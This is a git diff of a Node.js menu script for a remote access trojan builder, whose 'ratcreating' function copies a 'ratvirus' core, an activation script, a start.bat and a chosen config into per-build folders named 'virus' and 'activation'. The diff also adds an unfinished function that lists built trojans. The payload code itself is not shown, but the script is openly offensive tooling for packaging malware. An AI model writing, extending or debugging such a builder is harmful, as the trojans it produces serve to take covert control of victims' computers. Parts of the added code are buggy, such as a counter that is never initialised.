@@ -208,8 +208,37 @@ menu.configdelete = function () { // not ready
 
 // Rats
 menu.ratdeleting = function () { // not ready
+    let ratsobj = {
+        arr: []
+    }
+    let counter
     return new Promise(function (resolve) {
-
+        fs.readdir("./ratexes", (err, files) => {
+            if (files.length == 0) {
+                resolve(true)
+            } else {
+                console.log("Lol")
+                files.forEach(nazvratnika => {
+                    fs.stat(__dirname + "/ratexes/" + nazvratnika, (err, stats) => {
+                        if (stats.isDirectory()) {
+                            fs.exists(__dirname + "/ratexes/" + nazvratnika + "/LICENSE.md", exist => {
+                                if (exist) {
+                                    console.log("Lol")
+                                    let localnamerat = nazvratnika.split("/")
+                                    ratsobj.arr[ratsobj.arr.length] = [nazvratnika, localnamerat]
+                                }
+                            })
+                        }
+                    })
+                    counter++
+                    if (counter == files.length - 1) {
+                        resolve(ratsobj)
+                    }
+                })
+            }
+        })
+    }).then(() => {
+        console.log(ratsobj)
     })
 }
 menu.ratcreating = function () { // full ready
@@ -223,10 +252,7 @@ menu.ratcreating = function () { // full ready
 
             stdio.ask(nowlang.rats.ratcreating.asks.selectedconfig).then(selectedconfig => {
                 let intselectedconfig = parseInt(selectedconfig, 10)
-                //console.log(`\n${typeof (intselectedconfig)} |   ${typeof (selectedconfig)}`)
-
                 stdio.ask(nowlang.rats.ratcreating.asks.ratfilename).then(ratfilename => {
-
                     fs.readFile(`${__dirname}\\ratresources\\ratvirus\\ratcore.js`, 'utf8', function (err, contents) {
                         if (!err) {
                             fs.exists(`${__dirname}\\ratexes`, existratsfolder => {
@@ -236,48 +262,22 @@ menu.ratcreating = function () { // full ready
                                             console.error(err)
                                         }
                                     })
-
                                 }
                                 fs.mkdir(`${__dirname}\\ratexes\\${ratfilename}`, err => {
                                     fs.mkdir(`${__dirname}\\ratexes\\${ratfilename}\\virus`, err => {
                                         fs.mkdir(`${__dirname}\\ratexes\\${ratfilename}\\activation`, err => {
                                             // СОЗДАНО, ПЕРЕЙДИТЕ К АКТИВАЦИИ
+                                            let resourcescopy = [['./ratresources/ratactivation/node_modules', `${__dirname}\\ratexes\\${ratfilename}\\activation\\node_modules`], ['./ratresources/ratactivation/ratactivationcore.js', `${__dirname}\\ratexes\\${ratfilename}\\activation\\ratactivationcore.js`], ['./ratresources/ratactivation/start.bat', `${__dirname}\\ratexes\\${ratfilename}\\activation\\start.bat`], [`${configsobj.configs.paths[intselectedconfig - 1]}`, `${__dirname}\\ratexes\\${ratfilename}\\activation\\config.json`], [`./ratresources/ratvirus/node_modules`, `${__dirname}\\ratexes\\${ratfilename}\\virus\\node_modules`], ["./LICENSE.md", `${__dirname}\\ratexes\\${ratfilename}\\LICENSE.md`]]
 
-                                            fs.copy('./ratresources/ratactivation/node_modules', `${__dirname}\\ratexes\\${ratfilename}\\activation\\node_modules`, (err) => {
-                                                if (err) {
-                                                    console.error("1" + err);
-                                                } else {
-
-                                                }
-                                            });
-                                            fs.copy('./ratresources/ratactivation/ratactivationcore.js', `${__dirname}\\ratexes\\${ratfilename}\\activation\\ratactivationcore.js`, function (err) {
-                                                if (err) {
-                                                    console.error("2" + err);
-                                                } else {
-
-                                                }
-                                            });
-                                            fs.copy('./ratresources/ratactivation/start.bat', `${__dirname}\\ratexes\\${ratfilename}\\activation\\start.bat`, function (err) {
-                                                if (err) {
-                                                    console.error("3" + err);
-                                                } else {
-
-                                                }
-                                            });
-                                            fs.copy(`${configsobj.configs.paths[intselectedconfig - 1]}`, `${__dirname}\\ratexes\\${ratfilename}\\activation\\config.json`, function (err) {
-                                                if (err) {
-                                                    console.error(`${configsobj.configs.paths[intselectedconfig]}`);
-                                                } else {
-
-                                                }
-                                            });
-                                            fs.copy(`./ratresources/ratvirus/node_modules`, `${__dirname}\\ratexes\\${ratfilename}\\virus\\node_modules`, function (err) {
-                                                if (err) {
-                                                    console.error(`${configsobj.configs.paths[intselectedconfig]}`);
-                                                } else {
-
-                                                }
-                                            });
+                                            resourcescopy.forEach(arr => {
+                                                fs.copy(arr[0], arr[1], err => {
+                                                    if (err) {
+                                                        if (debugmode == "-debug") {
+                                                            console.log("[CompileERROR] From: " + arr[0] + "\n To: " + arr[1])
+                                                        }
+                                                    }
+                                                })
+                                            })
                                             resolve()
                                         })
                                     })
@@ -287,7 +287,6 @@ menu.ratcreating = function () { // full ready
 
                         }
                     });
-
                 })
             })
         })
